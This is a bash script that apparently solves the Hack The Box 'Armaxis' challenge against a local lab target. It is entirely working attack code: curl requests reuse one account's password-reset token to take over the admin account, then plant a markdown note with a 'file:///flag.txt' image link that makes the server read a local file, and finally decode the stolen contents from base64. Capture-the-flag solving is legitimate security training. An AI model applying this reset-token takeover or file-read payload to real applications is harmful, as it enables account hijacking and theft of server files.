#!/bin/bash
# https://app.hackthebox.com/challenges/Armaxis
# Tags: Authentication bypass, Command Injection, JS

TARGET=127.0.0.1
TARGET_APP=$TARGET:1337
TARGET_EMAIL_APP=$TARGET:8080

echo -e "[\u2714] Registering test@email.htb"
curl -s http://$TARGET_APP/register -H "Content-Type: application/json" -d '{"email":"test@email.htb","password":"pass"}' -o /dev/null

echo -e "[\u2714] Resetting password for admin@armaxis.htb"
curl -s http://$TARGET_APP/reset-password/request -H "Content-Type: application/json" -d '{"email":"test@email.htb"}' -o /dev/null
TOKEN=$(curl -s http://$TARGET_EMAIL_APP | grep -oP "Use this token to reset your password: \K\w+" | tail -1)
curl -s http://$TARGET_APP/reset-password/request -H "Content-Type: application/json" -d '{"email":"admin@armaxis.htb"}' -o /dev/null
curl -s http://$TARGET_APP/reset-password -H "Content-Type: application/json" -d "{\"token\":\"$TOKEN\",\"email\":\"admin@armaxis.htb\",\"newPassword\":\"pass\"}" -o /dev/null

echo -e "[\u2714] Capturing the flag"
curl -s -c cookies.txt http://$TARGET_APP/login -H "Content-Type: application/json" -d '{"email":"admin@armaxis.htb","password":"pass"}' -o /dev/null
curl -s -b cookies.txt http://$TARGET_APP/weapons/dispatch -H "Content-Type: application/json" -d '{"name":"Flag", "price":1.0, "note":"![Flag](file:///flag.txt)", "dispatched_to":"test@email.htb"}' -o /dev/null
curl -s -c cookies.txt http://$TARGET_APP/login -H "Content-Type: application/json" -d '{"email":"test@email.htb","password":"pass"}' -o /dev/null
FLAG=$(curl -s -b cookies.txt http://$TARGET_APP/weapons | grep -oP 'data:image/[^;]+;base64,\K[^\"]+' | tail -1 | base64 -d)
echo -e "[\u2714] Flag captured: \e[1;37m$FLAG\e[0m"

rm cookies.txt